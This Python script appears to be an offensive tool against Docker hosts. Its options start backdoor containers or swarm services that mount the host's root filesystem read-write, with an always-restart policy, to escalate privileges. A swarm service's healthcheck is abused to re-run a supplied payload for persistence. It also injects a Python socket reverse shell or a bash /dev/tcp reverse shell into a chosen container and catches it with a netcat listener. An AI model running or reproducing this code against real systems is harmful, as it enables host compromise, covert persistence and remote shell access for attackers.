import docker
import argparse
import sys
import subprocess
import socket

parser = argparse.ArgumentParser()

parser.add_argument('--list-containers', action='store_true', help='List all containers')
parser.add_argument('-i', '--into', metavar='', help='Connecting container, -i <id_container>')
parser.add_argument('-r', '--remove', metavar='', help='Remove container, -r <id_container>')

group = parser.add_argument_group('Container Backdoor')
group.add_argument('-p', '--payload', metavar='', help='Payload of reverse shell')
group.add_argument('--persistent', action='store_true', help='Maintain persistent connection')
group.add_argument('--backdoor', action='store_true', help='Backdoor for accessing the host filesystem')

args = parser.parse_args()

if len(sys.argv) < 2:
    parser.print_help()

client = docker.from_env()
COUNT = 0

def list_containers():
    for container in client.containers.list():
        global COUNT
        COUNT+=1
        container_id = container.short_id
        container_name = container.name
        container_status = container.status
        container_image = container.attrs['Config']['Image']
        container_ipadd = container.attrs['NetworkSettings']['IPAddress']
        container_gateway = container.attrs['NetworkSettings']['Gateway']
        container_ports = container.attrs['NetworkSettings']['Ports']
        container_mount = container.attrs['Mounts']

        print(f"[{COUNT}] ID: {container_id}\
        \n\tName: {container_name}\
        \n\tImage: {container_image}\
        \n\tStatus: {container_status}\
        \n\tNetwork: {container_ipadd} | Gateway: {container_gateway}\
        \n\tPorts: {container_ports}\
        \n\tMount: {container_mount}\n")

def remove_container():
    id_container = client.containers.get(f'{args.remove}')

    try:
        id_swarm = id_container.attrs['Config']['Labels']['com.docker.swarm.service.id']
        id_swarm = client.services.get(id_swarm)
        id_swarm.remove()
    except:
        id_container.stop()
        id_container.remove()

    print(f"[x] Remove container {id_container.short_id}")

def backdoor_swarm():
    print("[+] Payload: YES")
    file = open(args.payload, "r")
    payload = file.read()
    file.close()

    healthtest = ['CMD', 'python3', '-c', payload]
    cmd = 'python -c "while True: import time; time.sleep(1)"'
    mount = ["/:/host:rw"]
    print("[+] Mount bind: / -> /host")

    client.services.create(
        name='python',
        image='python:3.6.10-alpine3.11',
        command=cmd,
        tty=True,
        mounts=mount,
        healthcheck={
            "test": healthtest,
            "interval": 1000000 * 30 * 1000,
            "timeout": 1000000 * 300 * 1000,
            "retries": 3,
            "start_period": 1000000 * 30 * 1000
        }
    )

def backdoor_container():
    print("[+] Creating container to privilege escalation...")
    if args.persistent and args.payload:
        backdoor_swarm()
    else:
        volumes = {
            '/': {
                'bind': '/host',
                'mode': 'rw'
            }
        }
        restart = {
            "Name": "always"
        }

        backdoor = client.containers.run('python:3.6.10-alpine3.11', volumes=volumes, detach=True, tty=True, restart_policy=restart)
        
        container_id = backdoor.short_id
        print(f"[+] ID Container: {container_id}\
        \n[+] Mount bind: / -> /host")

        if args.payload:
            print("[+] Payload: YES")
            file = open(args.payload, "r")
            payload = file.read()
            CMD = 'python3 -c "{0}"'.format(payload)
            file.close()
            backdoor.exec_run(CMD)
        else:
            print("[+] Payload: NO")

def get_open_port():
    p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    p.bind(("", 0))
    p.listen(1)
    port = p.getsockname()[1]
    p.close()
    return port

def into():
    L_PORT = get_open_port()
    MY_IP = socket.gethostbyname(socket.gethostname())
    NETCAT = f"nc -nlp {L_PORT}"

    try:
        id_container = client.containers.get(f'{args.into}')
        if id_container.attrs['Config']['Image'] == "python:3.6.10-alpine3.11":

            python_shell = f'import socket,subprocess,os;\
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
            s.connect(("{MY_IP}",{L_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\
            os.dup2(s.fileno(),2);\
            p=subprocess.call(["/bin/sh","-i"]);'

            CMD = "python3 -c '{0}'".format(python_shell)
        else:
            CMD = f'/bin/bash -c "/bin/bash -i > /dev/tcp/{MY_IP}/{L_PORT} 0<&1 2>&1"'
        try:
            subprocess.Popen(NETCAT.split())
        except:
            print("netcat not found")
        id_container.exec_run(CMD, tty=True)
    except:
        print("docker.errors.NotFound or docker.errors.APIError")

if __name__ == '__main__':
    if args.list_containers:
        list_containers()
    elif args.backdoor:
        backdoor_container()
    elif args.into:
        into()
    elif args.remove:
        remove_container()